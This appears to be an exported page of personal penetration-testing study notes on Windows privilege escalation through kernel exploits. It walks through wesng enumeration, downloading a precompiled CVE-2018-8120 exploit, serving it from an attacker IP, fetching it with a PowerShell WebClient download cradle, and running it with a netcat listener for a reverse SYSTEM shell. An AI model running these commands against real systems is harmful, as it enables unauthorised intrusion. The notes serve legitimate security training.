<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>1. Kernel Exploits</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>1. Kernel Exploits</h1><br/>• Kernels are the core of any operating system. Think of it as a layer between application software and the actual computer hardware.<br />• The kernel has complete control over the operating system.<br />• Exploiting a kernel vulnerability can result in execution as the SYSTEM user.<br /><br /><strong>Finding Kernel Exploits</strong><br />Finding and using kernel exploits is usually a simple process:<br />   1) Enumerate Windows version / patch level (systeminfo command)<br />   2) Find matching exploits (Google, ExploitDB, GitHub).<br />      ▪ Windows Exploit Suggester: <a href="https://github.com/bitsadmin/wesng">https://github.com/bitsadmin/wesng</a><br />      ▪ Watson: <a href="https://github.com/rasta-mouse/Watson">https://github.com/rasta-mouse/Watson</a><br />      ▪ <a href="Home--Penetration_Test_Methodology--Network_Pentest--Exploitation--search_exploit_for_Windows.html">Windows Exploit Suggester(wes.py)</a>: <a href="https://github.com/bitsadmin/wesng">https://github.com/bitsadmin/wesng</a><br />      ▪ Precompiled Kernel Exploits: <a href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a><br />      ▪ GitHub<br />      ▪ Google<br />      ▪ ExploitDB<br />   3) Compile and run.<br />Beware though, as Kernel exploits can often be unstable and may be one-shot or cause a system crash.<br /><br /><strong><h3>Tools</h3></strong><br />• <strong>Windows Exploit Suggester</strong>: <a href="https://github.com/bitsadmin/wesng">https://github.com/bitsadmin/wesng</a><br />   1) Copy the output of the systeminfo command.<br />        <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; systeminfo</pre></div><br />        paste in a file of the attacker machine<br />        <div class="codebox"><pre>root@kali<span style="color:#ff9d00;font-weight:700">:/</span># mousepad systeminfo.txt     <span style="color:#0088ff;font-weight:400">#paste here the output of the systeminfo command</span></pre></div><br />   2) Find Exploit with <a href="Home--Penetration_Test_Methodology--Network_Pentest--Exploitation--search_exploit_for_Windows.html">Windows Exploit Suggester(wes.py)</a><br />        <div class="codebox"><pre>root@kali<span style="color:#ff9d00;font-weight:700">:/</span># python3 <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>kali<span style="color:#ff9d00;font-weight:700">/</span>bin<span style="color:#ff9d00;font-weight:700">/</span>wesng<span style="color:#ff9d00;font-weight:700">/</span>wes.py <span style="color:#ff9d00;font-weight:700">/</span>home<span style="color:#ff9d00;font-weight:700">/</span>kali<span style="color:#ff9d00;font-weight:700">/</span>Desktop<span style="color:#ff9d00;font-weight:700">/</span>systeminfo.txt -i <span style="color:#3ad900;font-weight:400">&#39;Elevation of Privilege&#39;</span> --exploits-only</pre></div><br />        <a href=""><img src="images/1318-1.png" alt="images/1318-1.png" /></a><br />        <a href=""><img src="images/1318-2.png" alt="images/1318-2.png" /></a><br />   2.1) Cross-Reference with Precompiled Kernel Exploits: <a href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a><br />        If we do not find any matches on SecWiki, we have to go on Exploit DB<br />   2.2) Download the compiled exploit<br />        In the example CVE-2018-8210 <br />        <span style="color:#a5452a;">example:</span> <a href="https://github.com/SecWiki/windows-kernel-exploits/blob/master/CVE-2018-8120/x64.exe">https://github.com/SecWiki/windows-kernel-exploits/blob/master/CVE-2018-8120/x64.exe</a><br />        <div class="codebox"><pre>root@kali<span style="color:#ff9d00;font-weight:700">:/</span># <span style="color:#ff9d00;font-weight:700">wget</span> https<span style="color:#ff9d00;font-weight:700">://</span>github.com<span style="color:#ff9d00;font-weight:700">/</span>SecWiki<span style="color:#ff9d00;font-weight:700">/</span>windows-kernel-exploits<span style="color:#ff9d00;font-weight:700">/</span>raw<span style="color:#ff9d00;font-weight:700">/</span>master<span style="color:#ff9d00;font-weight:700">/</span>CVE-2018-8120<span style="color:#ff9d00;font-weight:700">/</span>x64.exe<br />root@kali<span style="color:#ff9d00;font-weight:700">:/</span># python -m SimpleHTTPServer 80</pre></div><br />   3) Retrieve and run the exploit<br />        <div class="codebox"><pre>root@kali<span style="color:#ff9d00;font-weight:700">:/</span># nc -nvlp 53</pre></div>     <br />        <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; (<span style="color:#ff9d00;font-weight:700">New-Object</span> System.Net.WebClient).downloadfile(<span style="color:#333333;font-weight:400">&#39;http://192.168.147.139/x64.exe&#39;</span>,<span style="color:#333333;font-weight:400">&#39;C:\Users\ckent\Desktop\x64.exe&#39;</span>);<br /><span style="color:#ff9d00;font-weight:700">PS</span>&gt; .<span style="color:#ff9d00;font-weight:700">\</span>x64 &lt;<span style="color:#00117f;font-weight:400">command-to-exexute</span>&gt;    <span style="color:#0088ff;font-weight:400">#the command to execute can be a reverse shell (the one that we have created with msfvenom)</span></pre></div><br />        <a href=""><img src="images/1318-3.png" alt="images/1318-3.png" /></a><br />        Now we should receive a SYSTEM shell on the Attacker listener<br />        <a href=""><img src="images/1318-4.png" alt="images/1318-4.png" /></a><br /><br />• <strong>Watson</strong>: <a href="https://github.com/rasta-mouse/Watson">https://github.com/rasta-mouse/Watson</a><br />    useful tool for the more recent Windows 10, always for enumerate the possibles kernel exploits<br /><br /><br /><br />Bibliography:<br />• “Windows Privilege Escalation for OSCP &amp; Beyond!”, Tib3rius</div>
</body>
</html>
